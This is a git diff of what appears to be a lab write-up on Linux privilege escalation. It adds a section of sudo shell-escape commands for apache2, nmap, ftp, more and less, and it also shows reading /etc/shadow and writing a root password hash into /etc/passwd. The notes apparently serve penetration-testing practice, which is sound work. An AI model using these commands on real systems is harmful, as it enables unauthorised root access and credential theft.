@@ -87,7 +87,7 @@ View the contents of the /etc/shadow file.
 cat /etc/shadow
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.
 
@@ -152,7 +152,7 @@ The /etc/passwd file contains information about user accounts. It is world-reada
 ls -l /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
 
 Generate a new password hash with a password of your choice.
 
@@ -172,7 +172,7 @@ Edit the /etc/passwd file and place the generated password hash between the firs
 vi /etc/passwd
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -181,20 +181,123 @@ su root
 Password: newpasswordhere
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Sudo - Shell Escape Sequences
 
 **Victim**
 
 ```
-z
+sudo -l
+```
+
+<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+### apache2
+
+We can use apache2 to read files and crack hashes.
+
+**Victim**
+
+```
+sudo apache2 -f /etc/shadow
+```
+
+<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+### **nmap**
+
+#### **Option 1**
+
+**Victim**
+
+```
+sudo nmap --interactive
+nmap> !sh
+```
+
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+#### **Option 2**
+
+**Victim**
+
+```
+echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+### ftp
+
+**Victim**
+
+```
+sudo ftp
+ftp> !/bin/sh
+```
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+## **more**
+
+Need to enter the second command while scrolling through the output.
+
+**Victim**
+
+```
+TERM= sudo more /etc/profile
+!/bin/sh
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### **less**
+
+#### **Option 1**
+
+**Victim**
+
+```
+sudo less /etc/profile
+!/bin/sh
+```
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+This option did not work on this box as when you click v it opens nano instead of vi or vim. If you can someone set the environment variables VISUAL and/or EDITOR, you could get this to work but it would be difficult.
+
+#### **Option 2**
+
+**Victim**
+
+```
+export VISUAL=vi
+export EDITOR=vi
+echo 'export EDITOR=vim' >> ~/.bash_profile
+echo 'export VISUAL=vim' >> ~/.bash_profile
+sudo less /etc/profile
+v
+:shell
+```
+
+#### **Option 3**
+
+**Victim**
+
+```
+VISUAL="/bin/sh -c '/bin/sh'" sudo less /etc/profile
+v
 ```
 
 **Victim**
 
 ```
-z
+s
 ```
 
 ## Sudo - Environment Variables
